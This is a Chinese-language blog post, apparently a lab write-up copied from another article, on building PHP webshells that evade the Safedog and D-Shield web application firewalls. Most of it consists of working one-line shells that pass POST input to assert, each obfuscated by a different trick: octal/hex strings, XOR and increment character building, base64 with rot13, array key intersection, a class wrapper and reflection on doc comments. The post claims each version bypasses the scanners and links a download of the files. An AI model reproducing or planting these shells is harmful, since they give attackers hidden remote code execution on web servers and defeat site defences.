---
title: "webshell_bypass安全狗、D盾"
categories: [ "安全技术" ]
tags: [ "webshell","bypass" ]
draft: false
slug: "15"
date: "2019-01-20 10:43:00"
---

#### 前言

不知道咋地啦，最近 Freebuf 和合天智汇都在发绕过 waf 的文章，一般来说都是见光死，而且只敢偶尔发一篇

但是最近连续几天都是 bypass 的文章，那就记录一下

**原文来源：** https://mp.weixin.qq.com/s/aAK2pLf3XX8AKz2-UoQbYQ

这篇文章就是将原文做一遍，侵删

#### 环境配置及 webshell 了解

- Virtualbox+Win7 SP1
- phpstudy2018 最近都没更新：http://down.php.cn/PhpStudy20180211.zip
- 安全狗，使用的是 Apache 版 V4.0：http://free.safedog.cn/website_safedog.html

![][1]

- D 盾，使用的是 Web 查杀版：http://www.d99net.net/

![][2]

关于给 Windows 中的 phpstudy 配置安全狗**这里有坑**，在安装安全狗的时候会跳出来一个配置界面：

![][3]

请自动忽略里面的红字，Win7 的话，先把 phpstudy 设置为服务模式，服务中出现 apache 服务后，停止 phpstudy，然后手动启动 apache 服务后安全狗就可以安装了

针对 win10 的话，你将 phpstudy 设置为系统服务模式的话，在 services.msc 中也是看不到 apache 的服务的，需要自己手动安装(cmd)：

- cd C:\phpStudy\PHPTutorial\Apache\bin
- httpd.exe -k install -n apache2.4

然后启动 apache2.4 服务，安全狗就能识别了

在 bypass 开始之前我们先了解一下 webshell 的组成：

![][4]

webshell 再怎么变化，都需要满足图中的两个条件，那么绕过 waf 就是通过变化这两个条件来实现的

我们先测试下 waf 的检测机制，我们准备以下三个文件：

php_1.php：`<?php eval($_POST['a']);?>`
php_2.php：

```
<?php
$a = "phpinfo();";
eval($a);?>
```

php_3.php：`<?php $_POST['a'];?>`

用安全狗检测一下：

![][5]

带有 eval 的敏感字符与及敏感传参的\$\_POST 并没有报毒，可以猜测 waf 的一部分机制是参数追踪与及综合判定。

#### bypass

1.关键字绕过

php 是个非常强大的语言对于字符串的各种变化都支持的非常好。

我们可以用进制转换，十六进制，八进制之类的。

```
<?php

$a="\141";#八进制的a
$a .= "\163";#八进制的s
$a .= "\x73";#十六进制的s
$a .= "\x65";#十六进制的e
$a .= "\x72";#十六进制的r
$a .= "\164";#十六进制的t
@$a($_POST["a"]);

?>
```

为什么不用 eval 而用 assert：eval 并不是一个函数，不支持这样子的调用。

这样就 bypass 了安全狗但是过不了 D 盾：

![][6]

2.算术运算

我们可以同通过自增，异或，取反等方法来获得我们想要的字母，再组合成函数，动态调用即可。

例如通过定义 a 然后进行自增运算得到其他想要的字符，但是注意并不能进行自减

![][7]

但是我们这样子取出来的只有小写字符，并不能得到我们想要\_POST，\_GET。

在 PHP 中，两个字符串执行异或操作以后，得到的还是一个字符串。

所以这里我们就可以用异或，取反来取我们想要的大写字母。

写个 php 脚本：

```
<?php
$a=array( "|","!", "@", "#", "%", "^", "&", "*", "(",  ")",  "-", "=", "_", "+", "<", ">", "?", "." , "{" , "}", "[", "]", "\\","~","`","/"); //特殊字符
$alength=count($a);

for($x=0;$x<$alength;$x++) {

for($b=0;$b<$alength;$b++){
echo "the result is ".($a[$x]^$a[$b])." the str is ".$a[$x].$a[$b]."<br>"; //输出遍历异或结果
}}
?>

```

把能想到特殊字符全部丢进去得到遍历异或的结果，然后再取我们想要的字符。这里我们就以取\_POST 为例子。

\_可以用|和#来进行异或得到：

![][8]

然后一个个找出来，得到的结果就是：

![][9]

结合我们上面的自增我们可以得到以下代码:

```
<?php
$_ = ('!'^'@');//a
$__ = $_;
$_++;#b
$_++;#c
$_++;#d
$_++;#e
$____ = $_;
$_++;#f
$_++;#g
$_++;#h
$_++;#i
$_++;#j
$_++;#k
$_++;#l
$_++;#m
$_++;#n
$_++;#o
$_++;#p
$_++;#q
$_++;#r
$___ = $_;
$_++;#s
$__ = $__.$_.$_.$____.$___;
$_++;#t
$__ = $__.$_;//assert
@$_____=('?'^'`').('-'^'}').('/'^'`').('('^'{').('~'^'*');// _POST
@$__(${$_____}[$_]);//t
?>
```

测试一下，可以过安全狗，但是过不了 D 盾，可是我们的安全等级下降了，问题不大，继续肝：

![][10]

3.编码加拼接

通过 base64 与及 rot13 编码，动态函数调用得到以下代码：

```
<?php
function moza($hello){
$b ="bmZmcmVn";
$d = str_rot13(base64_decode($b));
@$d($hello);
}
moza($_POST[1]);
?>

```

稳过安全狗，但是还是没有过 D 盾，可是等级我们再次降低了一个级别，变成二级了：

![][11]

我们可以再结合一下上面所说的，把自增运算与及参数的传递打破一下检测的规则。

```
<?php
function moza($a){
$_ = ('!'^'@');//a
$__ = $_;
$_++;$_++;$_++;$_++;$____ = $_;$_++;$_++;$_++;$_++;$_++;$_++;
$_++;$_++;$_++;$_++;$_++;$_++;$_++;$___ = $_;$_++;
$__ = $__.$_.$_.$____.$___;$_++;$__ = $__.$_;//assert
@$__($a);
}
$a=$_POST[1];
moza($a=$a);
print_r($_);
?>

```

![][12]

可以发现，安全狗我们再次无压力，并且 D 盾等级再次降低，降到了一级，只报了一个变量函数，针对这一点，我们再改一下。这次我们可以采用数组的方式，经过多次变换，再加上参数扰乱达到 bypass 的目的。

代码如下：

```
<?php
$a1=array("a"=>"red","ss"=>"green","c"=>"blue","er"=>"hello","t"=>"hey");
$a2=array("a"=>"red","ss"=>"blue","d"=>"pink","er"=>"hellos","moza"=>"good_boy","t"=>"hey");
$result=array_intersect_key($a1,$a2);//取数组交集
$a = array_keys($result);//取数组键值
$man = $a[0].$a[1].$a[2]."t";
$kk=$_POST['a'];
@$man($kk=$kk);
print_r($a1);//扰乱规则
?>
```

![][13]

可以发现我们已经 bypass 掉了安全狗，D 盾，深信服，360 主机卫士。

当然远不止这种方法，php 实在太灵活了。

- uopz_function()
- uasort()
- uksort()
- array_uintersect_uassoc()
- array_udiff_assoc()
  等等，都可以用来 bypass，用法可以自己尝试。

大佬还贴出了另外两种思路：

这个一句话是在鹏城杯线下赛中出现的，通过自增得到关键字，然后定义类，类内函数自调用来进行 bypass。

```
<?php
error_reporting(0);//去除错误回显
class Foo  //创建名为FOO的类
{
    function Variable($c)
    {
        $name = 'Bar';
        $b=$this->$name(); // 调用Bar
        $b($c);
    }
    function Bar()
    {
    	$__='a';
        $a1=$__; //$a1=a;
		$__++;$__++;$__++;$__++;//$a__=e;
		$a2=$__; //$a2=e;
		$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;//$__=r;
		$a3=$__++; //$a3=r;$__=s;
		$a4=$__++; //$a4=s;$__=t;
		$a5=$__;   //$a5=$__=t;
		$a=$a1.$a4.$a4.$a2.$a3.$a5; //$a=assert
        return $a; //将$a的值返回
    }
}
function variable(){
	$_='A';
	$_++;$_++;$_++;$_++;$_++;$_++;$_++;$_++;$_++;$_++;$_++;$_++;$_++;$_++; //$_=O;
	$b1=$_++; //$b1=O;$_=P;
	$b2=$_;   //$b2=$_=P
	$_++;$_++;$_++; //$_=S
	$b3=$_++; //$b3=S;$_=T;
	$b4=$_; //$b4=$_=T;
	$b='_'.$b2.$b1.$b3.$b4;//$b=_POST
	return $b; //将$b的值返回
}
$foo = new Foo(); //创建名为foo对象
$funcname = "Variable"; //将Variable的值赋给变量funcname
$bb=${variable()}[variable()]; // $bb=_POST[_POST]);
$foo->$funcname($bb); //调用 $foo->Variable($bb)
?>
```

另一种，我们可以利用 php 的反射机制，获取注释的内容，然后拼凑出 assert，从而动态执行，代码如下：

```
<?php
/**
-
as
-
5
-
se
-
*/
class a{
   function say(){$moza = "good_boy";}
}
$aa = new ReflectionClass(new a());//建立反射对象
$arr = explode("*", $aa->getDocComment());//获取对象a的注释
$str = ereg_replace("-","",$arr[2]);//获取对象a的注释
$payload = $str[4].$str[15].$str[15]."ert";//assert
$a = $_POST['a'];@$payload($a=$a);
?>
```

效果如下：

![][14]

这样子也可以 bypass D 盾安全狗 等。

Bypass 的思路还有：

- 缓存写 webshell
- 回调函数
- 正则匹配绕过
- 匿名函数

本文所有文件已打包：https://www.lanzous.com/i2xe6pa

[1]: https://img.soapffz.com/archives_img/2019/01/20/archives_20190120_105221.png
[2]: https://img.soapffz.com/archives_img/2019/01/20/archives_20190120_105621.png
[3]: https://img.soapffz.com/archives_img/2019/01/20/archives_20190120_110137.png
[4]: https://img.soapffz.com/archives_img/2019/01/20/archives_20190120_111310.png
[5]: https://img.soapffz.com/archives_img/2019/01/20/archives_20190120_111844.png
[6]: https://img.soapffz.com/archives_img/2019/01/20/archives_20190120_113023.png
[7]: https://img.soapffz.com/archives_img/2019/01/20/archives_20190120_113320.png
[8]: https://img.soapffz.com/archives_img/2019/01/20/archives_20190120_113642.png
[9]: https://img.soapffz.com/archives_img/2019/01/20/archives_20190120_113902.png
[10]: https://img.soapffz.com/archives_img/2019/01/20/archives_20190120_114323.png
[11]: https://img.soapffz.com/archives_img/2019/01/20/archives_20190120_115928.png
[12]: https://img.soapffz.com/archives_img/2019/01/20/archives_20190120_120233.png
[13]: https://img.soapffz.com/archives_img/2019/01/20/archives_20190120_120507.png
[14]: https://img.soapffz.com/archives_img/2019/01/20/archives_20190120_131752.png